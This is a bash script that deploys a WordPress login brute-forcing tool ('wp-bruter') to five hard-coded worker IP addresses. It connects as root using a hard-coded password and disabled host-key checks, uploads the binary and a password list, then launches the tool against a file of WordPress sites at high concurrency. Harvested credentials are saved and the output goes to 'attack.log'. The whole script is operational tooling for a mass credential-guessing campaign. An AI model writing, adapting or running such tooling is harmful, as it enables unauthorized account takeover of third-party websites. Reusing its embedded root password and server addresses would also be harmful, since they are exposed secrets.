#!/bin/bash
# Deploy the current wp-bruter binary to the worker fleet and restart the run.
# Workers only accept password auth; set WORKER_PASS to override.
set -u

WORKER_PASS="${WORKER_PASS:-fahrel}"
WORKERS=(
    "68.183.184.203"
    "139.59.114.182"
    "159.65.138.79"
    "206.189.90.210"
    "188.166.252.160"
)

SSH_OPTS=(-o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=10)
ssh_cmd() { sshpass -p "$WORKER_PASS" ssh "${SSH_OPTS[@]}" "root@$1" "${@:2}"; }
scp_cmd() { sshpass -p "$WORKER_PASS" scp "${SSH_OPTS[@]}" "$1" "root@$2:$3"; }

echo "Deploying to ${#WORKERS[@]} workers..."

for WORKER in "${WORKERS[@]}"; do
    echo "[$WORKER]"
    (
        # The running executable cannot be overwritten in place (ETXTBSY):
        # upload beside it and rename.
        scp_cmd wp-bruter "$WORKER" /opt/wp-bruter/wp-bruter.new 2>/dev/null &&
        scp_cmd pass.txt "$WORKER" /opt/wp-bruter/pass.txt.new 2>/dev/null

        ssh_cmd "$WORKER" "
            mv -f /opt/wp-bruter/wp-bruter.new /opt/wp-bruter/wp-bruter
            mv -f /opt/wp-bruter/pass.txt.new /opt/wp-bruter/pass.txt
            pkill -9 wp-bruter 2>/dev/null || true
            # A SIGTERM drain can take a while (in-flight 5s requests); -9 is
            # immediate, but wait for the PID to disappear before restarting so
            # the new instance is not refused.
            for i in \$(seq 1 30); do pgrep -f wp-bruter >/dev/null || break; sleep 1; done
            sleep 1
            mkdir -p /opt/wp-bruter
            chmod +x /opt/wp-bruter/wp-bruter
            # Diagnostic log is appended beside the binary; creds.txt too.
            echo '' > /opt/wp-bruter/debug.log
            cd /opt/wp-bruter
            nohup ./wp-bruter \
                -sites /root/wordpress.txt \
                -passlist pass.txt \
                -output results.txt \
                -max-workers 200 \
                -max-active-sites 800 \
                -timeout 5 \
                -verbose \
                >> attack.log 2>&1 &
            sleep 2
            pgrep -f wp-bruter > /dev/null && echo '  ✅ Running' || echo '  ❌ Failed'
        " 2>/dev/null
    ) &
done

wait
echo "✅ Deploy finished"
